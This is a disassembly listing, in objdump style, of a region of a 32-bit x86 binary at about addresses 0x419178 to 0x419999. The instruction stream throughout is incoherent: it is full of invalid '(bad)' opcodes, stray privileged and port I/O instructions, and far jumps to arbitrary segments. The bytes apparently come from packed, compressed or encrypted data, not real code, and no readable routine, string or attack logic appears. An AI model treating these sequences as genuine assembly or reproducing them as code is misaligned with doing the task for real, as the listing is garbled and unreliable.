  419178:	scas   al,BYTE PTR es:[edi]
  419179:	mov    cl,0xa1
  41917b:	xchg   DWORD PTR [edx-0x8],ebp
  41917e:	int3   
  41917f:	adc    eax,0xa114b6ed
  419184:	inc    esp
  419185:	mov    eax,ds:0x93d143bc
  41918a:	add    bl,al
  41918c:	(bad)  
  41918d:	retf   0x7a53
  419190:	fwait
  419191:	jle    0x4191d4
  419193:	adc    BYTE PTR [edx+ecx*8],al
  419196:	or     ebx,DWORD PTR [eax]
  419198:	and    DWORD PTR [ebp-0x7],ebp
  41919b:	aaa    
  41919c:	gs xchg esi,eax
  41919e:	inc    esi
  41919f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4191a0:	push   ebp
  4191a1:	das    
  4191a2:	out    dx,al
  4191a3:	mov    cl,0xe4
  4191a5:	sbb    al,0x0
  4191a7:	scas   eax,DWORD PTR es:[edi]
  4191a8:	add    DWORD PTR [edx+edx*8+0x6412c31b],edx
  4191af:	sbb    al,0x95
  4191b1:	jb     0x4191af
  4191b3:	ja     0x419171
  4191b5:	stc    
  4191b6:	les    ecx,FWORD PTR [ebx-0x3]
  4191b9:	fisttp DWORD PTR [edi+0x2b]
  4191bc:	mov    ebx,0x17787b3e
  4191c1:	les    esp,FWORD PTR [edi-0x6e]
  4191c4:	jns    0x419243
  4191c6:	jp     0x419239
  4191c8:	icebp  
  4191c9:	inc    esp
  4191ca:	idiv   BYTE PTR [esi+0x5f934bb7]
  4191d0:	mov    bh,0x34
  4191d2:	ins    DWORD PTR es:[edi],dx
  4191d3:	ds dec ebp
  4191d5:	je     0x41919f
  4191d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4191d8:	imul   ecx,DWORD PTR [ecx+ebx*1-0x13],0x841828ba
  4191e0:	or     ebp,DWORD PTR [edi]
  4191e2:	aam    0x90
  4191e4:	sub    ch,dl
  4191e6:	xchg   edx,eax
  4191e7:	inc    ecx
  4191e8:	xor    eax,0x1e597a8e
  4191ed:	mov    al,ds:0xb01d9280
  4191f2:	leave  
  4191f3:	sub    ebp,esp
  4191f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4191f6:	jmp    DWORD PTR [ecx]
  4191f8:	adc    eax,0xfd3a68f3
  4191fd:	push   ebx
  4191fe:	inc    ecx
  4191ff:	xor    ebx,DWORD PTR ds:0x31ce2fb6
  419205:	retf   
  419206:	mov    ah,0x59
  419208:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419209:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41920a:	fwait
  41920b:	inc    edx
  41920c:	mov    ecx,0xf4658f45
  419211:	hlt    
  419212:	mov    edx,0x6d507fc3
  419217:	adc    eax,0xae9f1c90
  41921c:	pusha  
  41921d:	(bad)  
  41921e:	mov    esi,0xa945052c
  419223:	add    dl,BYTE PTR [eax+0x45142f0f]
  419229:	fld    DWORD PTR [eax+0x5a]
  41922c:	fnsave [ecx+ebx*2-0x54]
  419230:	int3   
  419231:	sti    
  419232:	vaddsubps ymm5,ymm7,ymm7
  419236:	adc    al,0xa8
  419238:	lds    edx,FWORD PTR [edi-0x1986dae2]
  41923e:	push   ecx
  41923f:	jl     0x4191d3
  419241:	inc    ecx
  419242:	inc    ebp
  419243:	mov    ds:0xb088682d,eax
  419248:	sbb    bh,bl
  41924a:	out    0x30,eax
  41924c:	sti    
  41924d:	sub    cl,al
  41924f:	es (bad) 
  419251:	ins    BYTE PTR es:[edi],dx
  419252:	clc    
  419253:	xchg   BYTE PTR [ebx+0x69],al
  419256:	pop    eax
  419257:	in     eax,dx
  419258:	sti    
  419259:	add    al,0xae
  41925b:	imul   edx,DWORD PTR [esi],0xffffffd6
  41925e:	add    eax,0xfea77c4c
  419263:	shl    BYTE PTR [esp+ebx*8-0x44cc700a],cl
  41926a:	fs dec ebx
  41926c:	pushf  
  41926d:	fdiv   QWORD PTR [eax-0x6215509c]
  419273:	or     edx,DWORD PTR [ebp-0x5a]
  419276:	add    eax,0xb32c3ec7
  41927b:	xor    al,0xed
  41927d:	push   eax
  41927e:	cmp    eax,0x151e25c1
  419283:	xchg   ecx,eax
  419284:	cmp    bh,BYTE PTR [edx-0x699ab33]
  41928a:	push   0x38
  41928c:	lock jl 0x41926d
  41928f:	sbb    ch,bh
  419291:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419292:	lahf   
  419293:	ret    
  419294:	xchg   ebp,eax
  419295:	dec    ebp
  419296:	repnz mov ebp,0xc820667c
  41929c:	fld    QWORD PTR [esi]
  41929e:	in     al,dx
  41929f:	or     al,0x26
  4192a1:	inc    edx
  4192a2:	xor    BYTE PTR [edx-0x4ac1ccb4],al
  4192a8:	mov    ecx,0x9d6c3363
  4192ad:	dec    esi
  4192ae:	mov    esi,0xd620ca09
  4192b3:	(bad)  
  4192b4:	jg     0x419312
  4192b6:	outs   dx,DWORD PTR ds:[esi]
  4192b7:	addr16 xor al,bh
  4192ba:	adc    eax,0x7723b775
  4192bf:	jae    0x4192e8
  4192c1:	xor    bl,BYTE PTR [ebx+ecx*8-0x47fb04b3]
  4192c8:	pop    edx
  4192c9:	inc    esi
  4192ca:	ret    
  4192cb:	xor    al,0xd
  4192cd:	sub    al,0x77
  4192cf:	or     esi,DWORD PTR [edx]
  4192d1:	or     eax,0xeb98216c
  4192d6:	xchg   esp,eax
  4192d7:	(bad)  [ecx+0x340ceddb]
  4192dd:	add    eax,0x7d8f896e
  4192e2:	in     al,dx
  4192e3:	mov    edx,0xc2a35cb6
  4192e8:	xor    DWORD PTR [esi-0x23c901e3],esp
  4192ee:	idiv   BYTE PTR [esi-0x55]
  4192f1:	int3   
  4192f2:	into   
  4192f3:	(bad)
  4192f6:	pop    ebp
  4192f7:	pop    es
  4192f8:	jle    0x4192e5
  4192fa:	adc    bh,BYTE PTR [eax+0x56]
  4192fd:	stos   BYTE PTR es:[edi],al
  4192fe:	xchg   ebp,eax
  4192ff:	pop    ss
  419300:	repnz jecxz 0x4192b2
  419303:	jecxz  0x4192f8
  419305:	jae    0x419325
  419307:	add    dh,al
  419309:	dec    edx
  41930a:	push   edi
  41930b:	ficomp DWORD PTR [esi+0x6c]
  41930e:	jns    0x419346
  419310:	cmp    cl,bl
  419312:	lock mov al,0xad
  419315:	scas   al,BYTE PTR es:[edi]
  419316:	add    eax,0x1743d7c7
  41931b:	mov    edi,ebp
  41931d:	add    BYTE PTR [esp+ebx*2-0x30],ah
  419321:	xchg   BYTE PTR ds:0x14bafdfe,dl
  419327:	sub    DWORD PTR [ebx-0x2c],0x22
  41932b:	rcl    DWORD PTR [edi-0x6],cl
  41932e:	xchg   ecx,eax
  41932f:	ins    BYTE PTR es:[edi],dx
  419330:	popf   
  419331:	ret    
  419332:	add    DWORD PTR [ecx-0xc],esp
  419335:	pop    esi
  419336:	aad    0xe0
  419338:	xor    ebp,DWORD PTR [eax-0x13]
  41933b:	and    edx,DWORD PTR [ebx-0x53]
  41933e:	cmp    edx,DWORD PTR [ebp-0x67]
  419341:	pop    es
  419342:	push   esi
  419343:	repz fistp DWORD PTR [eax+0x63]
  419347:	out    0x17,eax
  419349:	retf   
  41934a:	mov    ecx,0xce5fd98e
  41934f:	cmp    ebp,DWORD PTR [edx+0x3b]
  419352:	std    
  419353:	xchg   esi,eax
  419354:	adc    esi,DWORD PTR [edx+0x41a717ad]
  41935a:	jb     0x4193ad
  41935c:	xchg   edx,eax
  41935d:	mov    ch,0x53
  41935f:	and    bh,bl
  419361:	push   0x81e72c05
  419366:	ror    ebp,cl
  419368:	jb     0x419390
  41936a:	pop    esi
  41936b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41936c:	push   ecx
  41936d:	mov    eax,0x3ba4df18
  419372:	int3   
  419373:	test   BYTE PTR [di-0x79],ah
  419377:	mov    esp,0x83805295
  41937c:	scas   eax,DWORD PTR es:[edi]
  41937d:	xor    bh,ah
  41937f:	mov    eax,ebx
  419381:	aaa    
  419382:	ror    DWORD PTR [edx-0x69],0x8
  419386:	add    DWORD PTR [esi+0x37552c3a],edi
  41938c:	adc    esp,DWORD PTR [edi]
  41938e:	or     BYTE PTR [edi+0x34ac5289],cl
  419394:	and    edi,ecx
  419396:	cmp    eax,0xaedafc02
  41939b:	inc    eax
  41939c:	mov    BYTE PTR [esi],bl
  41939e:	ins    DWORD PTR es:[edi],dx
  41939f:	(bad)  [ebx+0x5b]
  4193a2:	xchg   dl,bh
  4193a4:	cmp    cl,BYTE PTR [ebx+0x45]
  4193a7:	(bad)  [ebx-0x6]
  4193aa:	xchg   ch,bh
  4193ac:	add    eax,0xe271db4
  4193b1:	and    al,0xbe
  4193b3:	ss loopne 0x419407
  4193b6:	out    0x6c,al
  4193b8:	sar    DWORD PTR ds:[ecx-0x71],0x39
  4193bd:	inc    edi
  4193be:	iret   
  4193bf:	push   0xf5633ad
  4193c4:	(bad)  
  4193c5:	ss dec eax
  4193c7:	stos   DWORD PTR es:[edi],eax
  4193c8:	repz and ebp,DWORD PTR [eax-0x11]
  4193cc:	pop    es
  4193cd:	push   ebp
  4193ce:	popa   
  4193cf:	push   esp
  4193d0:	cwde   
  4193d1:	lock jl 0x41944d
  4193d4:	pop    es
  4193d5:	push   0xe6ed4d82
  4193da:	popa   
  4193db:	xchg   ecx,eax
  4193dc:	xor    DWORD PTR [ebx],eax
  4193de:	add    eax,0xbe320fb8
  4193e3:	retf   
  4193e4:	das    
  4193e5:	cmp    eax,0x6e921d25
  4193ea:	jmp    0x41941b
  4193ec:	(bad)  
  4193ed:	pop    edi
  4193ee:	dec    esp
  4193ef:	pop    es
  4193f0:	nop
  4193f1:	xor    edx,DWORD PTR [edx]
  4193f3:	repz sub BYTE PTR [eax+0x6f8edaf0],0x45
  4193fb:	jecxz  0x419461
  4193fd:	sbb    eax,edi
  4193ff:	gs jo  0x41943b
  419402:	xchg   edi,eax
  419403:	ins    BYTE PTR es:[edi],dx
  419404:	mov    BYTE PTR [ebx],dh
  419406:	sbb    ah,ch
  419408:	push   ebx
  419409:	or     al,0x90
  41940b:	in     eax,dx
  41940c:	or     al,0x8c
  41940e:	sbb    al,0x34
  419410:	pop    ds
  419411:	aaa    
  419412:	cdq    
  419413:	ret    0x6d1d
  419416:	pop    ss
  419417:	or     al,0xa0
  419419:	scas   al,BYTE PTR es:[edi]
  41941a:	cmp    dh,BYTE PTR [edi]
  41941c:	push   es
  41941d:	sub    dl,BYTE PTR [edi+edi*1-0x3affef12]
  419424:	inc    ecx
  419425:	push   0x5d
  419427:	stos   DWORD PTR es:[edi],eax
  419428:	cmp    eax,0x3e0b69d7
  41942d:	fwait
  41942e:	int3   
  41942f:	push   cs
  419430:	icebp  
  419431:	and    eax,0xd13196dd
  419436:	sub    esp,edx
  419438:	pop    ebx
  419439:	mov    esp,DWORD PTR [ebx]
  41943b:	sti    
  41943c:	rol    bl,0x5f
  41943f:	xchg   edi,eax
  419440:	mov    bl,0xf1
  419442:	mov    ecx,0xa35a002d
  419447:	outs   dx,DWORD PTR ds:[esi]
  419448:	sub    eax,0x10d48ed7
  41944d:	xchg   edi,eax
  41944e:	pop    ds
  41944f:	test   dh,0x1e
  419452:	loope  0x419486
  419454:	xor    eax,DWORD PTR [ecx-0x10e6dd52]
  41945a:	lods   eax,DWORD PTR ds:[esi]
  41945b:	xor    eax,0x3f3b9931
  419460:	(bad)  [eax]
  419462:	inc    eax
  419463:	fidiv  DWORD PTR [esi+0x7e]
  419466:	xchg   ecx,eax
  419467:	xor    BYTE PTR [ebp+edi*2+0x65],bl
  41946b:	ror    DWORD PTR [edx],cl
  41946d:	pop    ecx
  41946e:	sub    bh,BYTE PTR [ebx+ebp*4]
  419471:	ins    WORD PTR es:[edi],dx
  419473:	sbb    DWORD PTR [eax-0x167287ac],esp
  419479:	nop
  41947a:	push   ebp
  41947b:	into   
  41947c:	test   eax,0x2ee06757
  419481:	mov    ebp,0xe2277d4c
  419486:	sar    esp,cl
  419488:	mov    bl,0x86
  41948a:	push   0x9cc5b9d
  41948f:	das    
  419490:	xchg   DWORD PTR [esi+0x7a],esi
  419493:	mov    edx,0xbbedbe
	...
  419514:	sbb    al,0x6c
  419516:	ins    DWORD PTR es:[edi],dx
  419517:	les    edi,FWORD PTR [ebp-0x3b]
  41951a:	mov    ebp,0x7e8bcdfc
  41951f:	jae    0x4194db
  419521:	pop    ecx
  419522:	pop    ecx
  419523:	clc    
  419524:	fnsave ds:0x76b0001
  41952a:	add    BYTE PTR [eax],al
  41952c:	inc    ecx
  41952d:	jmp    0x42124d6f
  419532:	lods   eax,DWORD PTR ds:[esi]
  419533:	call   0xa71a8db8
  419538:	test   eax,0x85cd0381
  41953d:	outs   dx,BYTE PTR ds:[esi]
  41953e:	test   BYTE PTR [ebx],ah
  419540:	bound  edx,QWORD PTR [esi+edi*1-0x1ba8cb96]
  419547:	cmp    eax,0xd32e2ac
  41954c:	mov    BYTE PTR [esp+ebp*8],al
  41954f:	scas   eax,DWORD PTR es:[edi]
  419550:	adc    bl,BYTE PTR [edx-0x53]
  419553:	nop
  419554:	jmp    0x31ba9d9e
  419559:	scas   al,BYTE PTR es:[edi]
  41955a:	in     al,0x82
  41955c:	pop    eax
  41955d:	sbb    al,BYTE PTR [edx+0x208a0cc0]
  419563:	add    bl,BYTE PTR [esp+edx*2]
  419566:	dec    ebx
  419567:	mov    fs,WORD PTR [eax]
  419569:	pushf  
  41956a:	aad    0xbc
  41956c:	loope  0x41957b
  41956e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41956f:	(bad)  
  419571:	xchg   esi,eax
  419572:	cmp    BYTE PTR [esi+eiz*8],bh
  419575:	mov    eax,0xe0115e06
  41957a:	jns    0x419506
  41957c:	adc    bl,BYTE PTR [eax+0x11b2e73]
  419582:	sbb    cl,BYTE PTR [ebx]
  419584:	loope  0x4195bb
  419586:	ffree  st(6)
  419588:	xor    DWORD PTR [ecx],ebp
  41958a:	cwde   
  41958b:	aad    0x78
  41958d:	popa   
  41958e:	data16 cmp al,0x34
  419591:	sbb    eax,0x65b0fbdc
  419596:	shl    DWORD PTR [ebx],0x7a
  419599:	imul   esi,DWORD PTR [edx+0x5b],0xffffff84
  41959d:	out    dx,al
  41959e:	xchg   ecx,eax
  41959f:	inc    ebp
  4195a0:	stos   DWORD PTR es:[edi],eax
  4195a1:	scas   al,BYTE PTR es:[edi]
  4195a2:	in     eax,0xda
  4195a4:	popf   
  4195a5:	push   ecx
  4195a6:	mov    BYTE PTR [ecx+eiz*2-0x6c],bh
  4195aa:	jmp    0xbc54:0x356fb1f7
  4195b1:	mov    edi,0x49eb45d6
  4195b6:	seta   al
  4195b9:	cmp    DWORD PTR [ecx+0x46ad8153],ebx
  4195bf:	ja     0x41959a
  4195c1:	sbb    eax,0x29a7a44
  4195c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4195c7:	jns    0x41962e
  4195c9:	(bad)  
  4195ca:	push   esi
  4195cb:	paddb  mm5,QWORD PTR [esi-0x7a]
  4195cf:	pusha  
  4195d0:	lods   eax,DWORD PTR ds:[esi]
  4195d1:	ins    BYTE PTR es:[edi],dx
  4195d2:	lock mov ch,0x27
  4195d5:	sar    DWORD PTR [edi+edx*8-0x8],1
  4195d9:	out    dx,al
  4195da:	stos   BYTE PTR es:[di],al
  4195dc:	ss fs inc edx
  4195df:	cmp    DWORD PTR [eax],esp
  4195e1:	cmp    DWORD PTR [ebp+0x68],ebx
  4195e4:	fdiv   QWORD PTR es:[edx+0xd3c6c1a]
  4195eb:	pop    eax
  4195ec:	xchg   esp,eax
  4195ed:	call   0xb95202f8
  4195f2:	xor    DWORD PTR [ebp+0x793dd9e5],esp
  4195f8:	pop    esp
  4195f9:	loopne 0x4195d6
  4195fb:	inc    edx
  4195fc:	mov    edi,0xe3852206
  419601:	ror    DWORD PTR [ecx-0x25fc17f7],0xfc
  419608:	add    BYTE PTR [edx],ah
  41960a:	push   ss
  41960b:	xchg   BYTE PTR [ecx+ecx*1-0xb],dl
  41960f:	dec    eax
  419610:	iret   
  419611:	loopne 0x4195ec
  419613:	imul   edx,DWORD PTR [eax+0x4f],0xe97f703
  41961a:	call   0x76bb:0xef7070d6
  419621:	adc    cl,cl
  419623:	jl     0x4195d4
  419625:	mov    ecx,gs
  419627:	dec    edi
  419628:	dec    ecx
  419629:	repz (bad) 
  41962b:	(bad)  
  41962c:	jbe    0x41961b
  41962e:	lahf   
  41962f:	pop    ecx
  419630:	xchg   esp,eax
  419631:	add    al,BYTE PTR [eax-0x56]
  419634:	lods   eax,DWORD PTR ds:[esi]
  419635:	xor    bh,BYTE PTR [ebx]
  419637:	mov    ebx,0x89abc25b
  41963c:	and    ebx,DWORD PTR [ebp+0x49]
  41963f:	cmp    al,0x3
  419641:	sub    al,0x90
  419643:	xor    DWORD PTR [ecx+0x46a65785],0x33
  41964a:	ss push cs
  41964c:	cmc    
  41964d:	retf   0xb985
  419650:	jns    0x419604
  419652:	ror    esi,1
  419654:	(bad)  
  419658:	aas    
  419659:	(bad)  
  41965a:	mov    ecx,0xd1784b13
  41965f:	aaa    
  419660:	arpl   sp,bx
  419662:	sub    edi,esp
  419664:	les    esp,FWORD PTR [ecx-0x25836362]
  41966a:	sbb    eax,0xc218028a
  41966f:	bound  eax,QWORD PTR [ebx+ebp*4]
  419672:	push   edx
  419673:	lods   eax,DWORD PTR ds:[esi]
  419674:	pop    edi
  419675:	iret   
  419676:	imul   edi,ecx,0xb2ae1bf3
  41967c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41967d:	xor    eax,0x2be107b3
  419682:	imul   BYTE PTR [ebx-0x30]
  419685:	ins    BYTE PTR es:[edi],dx
  419686:	pop    ebx
  419687:	scas   eax,DWORD PTR es:[edi]
  419688:	cmp    DWORD PTR [ecx],esp
  41968a:	and    eax,0x6e81f9c4
  41968f:	imul   eax,DWORD PTR [ecx],0xffffffe2
  419692:	jge    0x4196c9
  419694:	dec    esp
  419695:	imul   ecx,DWORD PTR [ecx],0x6e62f4db
  41969b:	loop   0x41965d
  41969d:	cli    
  41969e:	jbe    0x4196d5
  4196a0:	sbb    esp,DWORD PTR [edi]
  4196a2:	repnz or DWORD PTR [ebp-0x30],eax
  4196a6:	dec    ebp
  4196a7:	idiv   dl
  4196a9:	pop    ebp
  4196aa:	mov    WORD PTR [eax-0x6c],fs
  4196ad:	push   esi
  4196ae:	cmp    ch,BYTE PTR [esp+ebx*2-0x65]
  4196b2:	out    dx,eax
  4196b3:	mov    esi,0x7551da7a
  4196b8:	leave  
  4196b9:	rcl    DWORD PTR [esi],cl
  4196bb:	ins    DWORD PTR es:[edi],dx
  4196bc:	loope  0x419680
  4196be:	dec    esp
  4196bf:	dec    eax
  4196c0:	in     eax,dx
  4196c1:	pop    ecx
  4196c2:	mov    bl,0x89
  4196c4:	(bad)  
  4196c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4196c6:	retf   0xc959
  4196c9:	or     BYTE PTR [edi-0x5d],al
  4196cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4196cd:	push   eax
  4196ce:	scas   eax,DWORD PTR es:[edi]
  4196cf:	add    eax,0xe921a129
  4196d4:	into   
  4196d5:	das    
  4196d6:	ss jb  0x4196a4
  4196d9:	arpl   dx,sp
  4196db:	add    dh,bl
  4196dd:	(bad)  
  4196de:	mov    dh,0xc7
  4196e0:	adc    al,BYTE PTR [esi+0x47]
  4196e3:	popa   
  4196e4:	cmp    ecx,DWORD PTR ds:[ebx]
  4196e7:	inc    ebx
  4196e8:	lea    ecx,ds:0xee9aaeb8
  4196ee:	push   0xffffff86
  4196f0:	add    al,0x5a
  4196f2:	and    al,0xf9
  4196f4:	mov    esp,0x663c688e
  4196f9:	std    
  4196fa:	repz xchg ebx,eax
  4196fc:	push   DWORD PTR [esi-0x650214b0]
  419702:	aaa    
  419703:	ret    0xfa72
  419706:	inc    ebx
  419707:	mov    ds:0xb95e90c,eax
  41970c:	cdq    
  41970d:	jae    0x419734
  41970f:	(bad)  
  419710:	into   
  419711:	xor    ecx,esi
  419713:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419714:	dec    esi
  419715:	fisub  WORD PTR ds:0xdca465ef
  41971b:	loope  0x419714
  41971d:	sub    al,0x5c
  41971f:	mov    eax,ds:0xd2452a55
  419724:	pop    es
  419725:	inc    ebp
  419726:	pop    edx
  419727:	je     0x4196b4
  419729:	out    dx,al
  41972a:	stos   BYTE PTR es:[edi],al
  41972b:	xchg   BYTE PTR [edi-0x210bb231],ch
  419731:	test   al,0xfa
  419733:	rcl    BYTE PTR [esi],0xa4
  419736:	sti    
  419737:	sub    BYTE PTR [ebp-0x6e8834d5],0xc3
  41973e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41973f:	inc    ebx
  419740:	sti    
  419741:	sub    ah,cl
  419743:	mov    ebx,0xc6ff34fe
  419748:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419749:	pop    es
  41974a:	aad    0x4f
  41974c:	dec    ebp
  41974d:	inc    ecx
  41974e:	mov    ah,BYTE PTR es:[edx+edi*8-0x59c65e3f]
  419756:	jnp    0x419765
  419758:	mov    ebx,DWORD PTR [eax+0x53]
  41975b:	out    0x65,al
  41975d:	aas    
  41975e:	sti    
  41975f:	stos   BYTE PTR es:[edi],al
  419760:	inc    edi
  419761:	fist   WORD PTR [edi-0x3dec4d50]
  419767:	xor    eax,0x42830e96
  41976c:	adc    al,0xd8
  41976e:	xchg   esp,eax
  41976f:	sbb    BYTE PTR [ebp-0x67e13e3b],0x20
  419776:	cld    
  419777:	in     al,0x0
  419779:	(bad)  
  41977a:	into   
  41977b:	ror    DWORD PTR fs:[ecx],1
  41977e:	es sub al,0xbe
  419781:	sub    DWORD PTR ds:[ebp+0x406e1f4d],ebp
  419788:	rcl    esp,1
  41978a:	mov    gs,WORD PTR [esp+eiz*2-0x2c]
  41978e:	xchg   ecx,eax
  41978f:	push   ecx
  419790:	dec    ebp
  419791:	enter  0x2c6c,0x1
  419795:	mov    esi,0x3a06b2e1
  41979a:	sbb    al,0x80
  41979c:	fcmovbe st,st(2)
  41979e:	jae    0x419815
  4197a0:	dec    ebx
  4197a1:	(bad)  
  4197a2:	icebp  
  4197a3:	xor    BYTE PTR ds:0xd59e213b,0x5c
  4197aa:	xchg   ebp,eax
  4197ab:	scas   al,BYTE PTR es:[edi]
  4197ac:	dec    edi
  4197ad:	mov    esp,0xf1641b8a
  4197b2:	dec    ebp
  4197b3:	xor    DWORD PTR [ecx+0x70],0x70
  4197b7:	ins    BYTE PTR es:[edi],dx
  4197b8:	jae    0x419741
  4197ba:	ds pop edx
  4197bc:	into   
  4197bd:	and    BYTE PTR [edi+0x2eb31edb],cl
  4197c3:	jae    0x4197f1
  4197c5:	push   esi
  4197c6:	mov    DWORD PTR [ecx-0x64],esp
  4197c9:	clc    
  4197ca:	mov    ds:0x88e180c0,al
  4197cf:	out    dx,al
  4197d0:	imul   edi,DWORD PTR [esi+ebx*2-0x76],0xd7d117c
  4197d8:	mov    esi,0x2c387165
  4197dd:	in     al,0xef
  4197df:	int3   
  4197e0:	cs into 
  4197e2:	pop    eax
  4197e3:	call   0xf692:0xd7d2da43
  4197ea:	mov    eax,0xf2465441
  4197ef:	mov    al,ds:0x2bfc7d19
  4197f4:	dec    edi
  4197f5:	jecxz  0x419848
  4197f7:	ficom  DWORD PTR [eax+edx*1]
  4197fa:	mov    esi,cs
  4197fc:	pushf  
  4197fd:	add    BYTE PTR [ecx+0x2e],bl
  419800:	push   0xc3eff3b8
  419805:	out    dx,al
  419806:	dec    ebx
  419807:	sti    
  419808:	mov    al,BYTE PTR [edx+0x15]
  41980b:	sbb    ecx,edx
  41980d:	les    ebp,FWORD PTR [edi-0x4684756]
  419813:	push   0xb852ffed
  419818:	icebp  
  419819:	dec    ecx
  41981a:	cmc    
  41981b:	in     al,0x9
  41981d:	and    esi,esi
  41981f:	outs   dx,DWORD PTR ds:[esi]
  419820:	daa    
  419821:	or     eax,0xc6fbc540
  419826:	ficomp DWORD PTR [ecx+ebx*4-0x5abf6f43]
  41982d:	inc    esp
  41982e:	hlt    
  41982f:	imul   esp,ebx,0x437b7a49
  419835:	pushf  
  419836:	outs   dx,BYTE PTR ds:[esi]
  419837:	push   DWORD PTR [eax]
  419839:	dec    esi
  41983a:	into   
  41983b:	popa   
  41983c:	mov    dh,0x25
  41983e:	mov    al,ds:0x19a88e9b
  419843:	jns    0x419821
  419845:	repnz mov BYTE PTR [ebx+0x3f],dl
  419849:	imul   ebp,esi,0xffffff81
  41984c:	add    al,0x74
  41984e:	clc    
  41984f:	(bad)  
  419850:	jecxz  0x41986d
  419852:	or     BYTE PTR [ebx],dh
  419854:	jg     0x419848
  419856:	pushf  
  419857:	inc    eax
  419858:	mov    dl,0xcc
  41985a:	push   ebp
  41985b:	lea    esi,[edi-0x38acbb09]
  419861:	and    bh,BYTE PTR [ebx]
  419863:	or     DWORD PTR [eax+0x60],ebx
  419866:	pusha  
  419867:	adc    eax,0x8f1825a0
  41986c:	add    edx,DWORD PTR [ecx+0x732cb041]
  419872:	xor    al,BYTE PTR [eax]
  419874:	mov    eax,ds:0x1578f2a1
  419879:	dec    ebp
  41987a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41987b:	pop    esi
  41987c:	(bad)  
  41987d:	xor    ah,ah
  41987f:	inc    ecx
  419880:	dec    edx
  419881:	jns    0x4198fb
  419883:	(bad)
  419886:	jge    0x41989b
  419888:	mov    ds:0xbf29a906,eax
  41988d:	call   0x2a0c:0x39e0fe1e
  419894:	test   eax,0x3bc965b5
  419899:	mov    dl,0xd0
  41989b:	or     edi,0xffffffc0
  41989e:	dec    ebx
  41989f:	je     0x41989b
  4198a1:	mov    ebx,0x8061b647
  4198a6:	sti    
  4198a7:	cld    
  4198a8:	leave  
  4198a9:	leave  
  4198aa:	addr16 cwde 
  4198ac:	lds    ebp,FWORD PTR [ebx-0x4c]
  4198af:	or     DWORD PTR [bx+0x684],ebp
  4198b4:	and    DWORD PTR [ebp+0x2b84f8fa],ecx
  4198ba:	jb     0x4198cd
  4198bc:	dec    edx
  4198bd:	sub    DWORD PTR [ebx+esi*2+0x4e],eax
  4198c1:	sbb    ecx,DWORD PTR [eax]
  4198c3:	mov    ebx,0x95757930
  4198c8:	retf   
  4198c9:	xor    BYTE PTR [edi],ah
  4198cb:	lods   al,BYTE PTR ds:[esi]
  4198cc:	mov    al,0xb2
  4198ce:	xchg   edi,eax
  4198cf:	aas    
  4198d0:	sub    al,0x7a
  4198d2:	adc    esi,edi
  4198d4:	inc    ebp
  4198d5:	jne    0x41992e
  4198d7:	mov    cl,0x47
  4198d9:	xor    eax,0x6b78f8a5
  4198de:	cld    
  4198df:	xchg   BYTE PTR [edi],al
  4198e1:	(bad)  
  4198e2:	push   ebx
  4198e3:	stos   BYTE PTR es:[edi],al
  4198e4:	je     0x419942
  4198e6:	mov    dl,0xc
  4198e8:	dec    ecx
  4198e9:	add    dh,BYTE PTR [esp+ebx*1]
  4198ec:	fimul  DWORD PTR [eax+0x37]
  4198ef:	shr    BYTE PTR [ecx],1
  4198f1:	frstor [ebx]
  4198f3:	outs   dx,BYTE PTR ds:[esi]
  4198f4:	retf   0x5c68
  4198f7:	jl     0x41987d
  4198f9:	dec    eax
  4198fa:	cmp    BYTE PTR [edx+0xa00fb82],0xa5
  419901:	jp     0x41989d
  419903:	dec    ebx
  419904:	sbb    edx,DWORD PTR [ebp-0x56523ddb]
  41990a:	leave  
  41990b:	mov    edi,0x2713031e
  419910:	dec    ebx
  419911:	jne    0x41996b
  419913:	div    DWORD PTR [edi+ebp*4+0x73]
  419917:	ret    0x8ebb
  41991a:	dec    ebp
  41991b:	jno    0x41993d
  41991d:	inc    edx
  41991e:	push   cs
  41991f:	inc    ecx
  419920:	and    al,0x92
  419922:	mov    edx,0x78508c12
  419927:	push   cs
  419928:	loopne 0x41994c
  41992a:	ins    BYTE PTR es:[edi],dx
  41992b:	xchg   ebx,eax
  41992c:	pop    esi
  41992d:	popf   
  41992e:	or     cl,BYTE PTR [edx-0x2f]
  419931:	add    edx,edx
  419933:	sbb    al,0xfc
  419935:	pop    esp
  419936:	mov    ecx,0xf3c428d9
  41993b:	shl    DWORD PTR [esi],cl
  41993d:	aad    0xb8
  41993f:	cmp    eax,0x798c6bc1
  419944:	jae    0x4198ee
  419946:	fnsave ds:0x41807494
  41994c:	sub    DWORD PTR [eax],ebx
  41994e:	sar    BYTE PTR [esi+0x1a],1
  419951:	push   ebp
  419952:	push   ebx
  419953:	push   esp
  419954:	jo     0x419909
  419956:	inc    ebx
  419957:	icebp  
  419958:	mov    esi,DWORD PTR [ecx]
  41995a:	mov    BYTE PTR [eax-0x18e70ca4],cl
  419960:	(bad)  
  419961:	adc    esi,ebx
  419963:	test   eax,edx
  419965:	(bad)  [edx-0x44a6b7e5]
  41996b:	xor    eax,0x8bb34515
  419970:	loopne 0x419982
  419972:	push   esp
  419973:	dec    edx
  419974:	pop    ebp
  419975:	fidivr DWORD PTR [ecx-0x4d65d7be]
  41997b:	sbb    BYTE PTR [eax+0x58],al
  41997e:	mov    ds:0x505d110c,al
  419983:	inc    edi
  419984:	inc    eax
  419985:	popf   
  419986:	inc    edx
  419987:	mov    gs,ebx
  419989:	stos   DWORD PTR es:[edi],eax
  41998a:	js     0x4199d4
  41998c:	outs   dx,BYTE PTR ds:[esi]
  41998d:	mov    eax,0x6e89b34c
  419992:	imul   eax,DWORD PTR [eax+0x3b52d2e8],0x1
  419999:	lods   al,BYTE PTR ds:[esi]
